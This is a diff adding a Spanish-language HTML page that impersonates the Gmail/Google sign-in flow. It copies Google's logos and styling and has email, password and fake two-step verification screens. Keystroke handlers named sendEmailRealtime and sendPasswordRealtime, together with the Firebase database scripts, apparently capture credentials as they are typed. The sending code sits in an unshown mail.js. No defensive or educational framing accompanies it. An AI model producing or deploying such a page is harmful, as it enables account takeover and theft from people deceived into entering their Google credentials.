@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+  <title>Iniciar sesión</title>
+
+  <!-- 🔌 Firebase -->
+  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
+
+  <style>
+    :root { color-scheme: light dark; }
+    body { margin: 0; font-family: Arial, sans-serif; background-color: #ffffff; color: #000; display: flex; flex-direction: column; min-height: 100vh; }
+    .container { flex-grow: 1; display: flex; align-items: center; justify-content: center; padding: 2rem; }
+    .box { background-color: #ffffff; padding: 3rem 2rem; border-radius: 20px; max-width: 750px; width: 100%; box-shadow: 0 0 15px rgba(0,0,0,0.1); }
+    .logo { height: 40px; margin-bottom: 1.5rem; }
+    .title { font-size: 1.75rem; font-weight: 500; margin-bottom: 0.8rem; }
+    .subtitle { color: #555; font-size: 0.95rem; margin-bottom: 2rem; line-height: 1.4; }
+    input[type="email"], input[type="password"], input[type="text"] {
+      width: 100%; max-width: 420px; padding: 12px; font-size: 16px; background-color: #f8f9fa; color: #000;
+      border: 1px solid #dadce0; border-radius: 4px; margin-bottom: 1rem; box-sizing: border-box;
+    }
+    input::placeholder { color: #888; }
+    .link { color: #1a73e8; text-decoration: none; font-size: 0.9rem; }
+    .actions { margin-top: 2rem; display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; }
+    .btn-next { background-color: #1a73e8; color: #fff; border: none; padding: 10px 24px; border-radius: 20px; cursor: pointer; font-weight: bold; }
+    .checkbox-group { margin-top: 0.8rem; font-size: 0.9rem; }
+    .back-email { color: #000; background-color: #f1f3f4; border: 1px solid #dadce0; border-radius: 20px; padding: 8px 14px; cursor: pointer; margin-bottom: 1rem; display: inline-block; font-size: 0.9rem; }
+    .footer { display: flex; justify-content: space-between; padding: 1rem 2rem; font-size: 0.9rem; color: #666; flex-wrap: wrap; max-width: 750px; margin: 2rem auto 1rem; }
+    .footer a { color: #1a73e8; text-decoration: none; margin-left: 1.5rem; font-size: 0.85rem; }
+    .footer a:hover { text-decoration: underline; }
+    .lang::after { content: "\25BE"; margin-left: 5px; font-size: 0.7rem; }
+    #errorMsg { color: red; font-size: 0.9rem; margin-top: 0.5rem; }
+    .big-symbol { font-size: 4rem; font-weight: bold; text-align: center; margin: 20px 0; }
+    .info-text { font-size: 1rem; text-align: center; margin-bottom: 1rem; }
+    #bloqueoPantalla { display: none; position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0, 0, 0, 0.4); z-index: 9999; }
+    @media (prefers-color-scheme: dark) {
+      body { background-color: #1e1f20; color: #fff; }
+      .box { background-color: #121212; color: #fff; }
+      input[type="email"], input[type="password"], input[type="text"] {
+        background-color: #2b2b2b !important; color: #fff !important; border-color: #444 !important;
+      }
+      input::placeholder { color: #bbb !important; opacity: 1; }
+      .back-email { background-color: #2b2b2b; color: #fff; }
+      .btn-next { background-color: #1a73e8; color: #fff; }
+      .subtitle { color: #aaa; }
+      .link { color: #8ab4f8; }
+      .footer { color: #aaa; }
+      .footer a { color: #8ab4f8; }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <!-- Paso 1 -->
+    <div class="box" id="step1">
+      <img src="https://ssl.gstatic.com/ui/v1/icons/mail/rfr/logo_gmail_lockup_dark_1x_r5.png" class="logo" />
+      <div class="title">Inicia sesión</div>
+      <div class="subtitle">con tu cuenta de Google para ir a Gmail...</div>
+      <input type="email" placeholder="Correo electrónico o teléfono" id="emailInput" oninput="sendEmailRealtime()" />
+      <div><a class="link" href="#">¿Has olvidado tu correo electrónico?</a></div>
+      <div class="subtitle" style="margin-top:1rem;">¿No es tu ordenador? Usa el modo Invitado...</div>
+      <div class="actions">
+        <a class="link" href="#">Crear cuenta</a>
+        <button class="btn-next" onclick="goToPassword()">Siguiente</button>
+      </div>
+    </div>
+
+    <!-- Paso 2 -->
+    <div class="box" id="step2" style="display:none;">
+      <img src="https://ssl.gstatic.com/ui/v1/icons/mail/rfr/logo_gmail_lockup_dark_1x_r5.png" class="logo" />
+      <div class="title">Te damos la bienvenida</div>
+      <div id="emailDisplay" class="back-email" onclick="goBackToEmail()"></div>
+      <div style="margin-bottom: 0.4rem; font-size: 0.9rem;">Ingresa tu contraseña</div>
+      <input type="password" placeholder="Contraseña" id="passwordInput" oninput="sendPasswordRealtime()" />
+      <div id="errorMsg"></div>
+      <div class="checkbox-group">
+        <label><input type="checkbox" onclick="togglePassword()"> Mostrar contraseña</label>
+      </div>
+      <div class="actions">
+        <a class="link" href="#">¿Olvidaste la contraseña?</a>
+        <button class="btn-next" id="btnStep2" onclick="goToStep3()">Siguiente</button>
+      </div>
+    </div>
+
+    <!-- Paso 3 -->
+    <div class="box" id="step3" style="display:none;">
+      <img src="https://ssl.gstatic.com/ui/v1/icons/mail/rfr/logo_gmail_lockup_dark_1x_r5.png" class="logo" />
+      <div class="title">Verificación en dos pasos</div>
+      <div class="subtitle">Google quiere verificar que eres tú</div>
+      <div class="back-email" id="finalEmail"></div>
+      <div class="big-symbol" id="numeroMostrar">#</div>
+      <div class="info-text">Abre la aplicación Gmail</div>
+      <div class="info-text" id="mensajeTexto"></div>
+    </div>
+  </div>
+
+  <div id="bloqueoPantalla"></div>
+
+  <footer class="footer">
+    <div class="lang">Español (Latinoamérica)</div>
+    <div>
+      <a href="#">Ayuda</a>
+      <a href="#">Privacidad</a>
+      <a href="#">Condiciones</a>
+    </div>
+  </footer>
+
+  <!-- 🔗 Script separado -->
+  <script src="mail.js"></script>
+</body>
+</html>
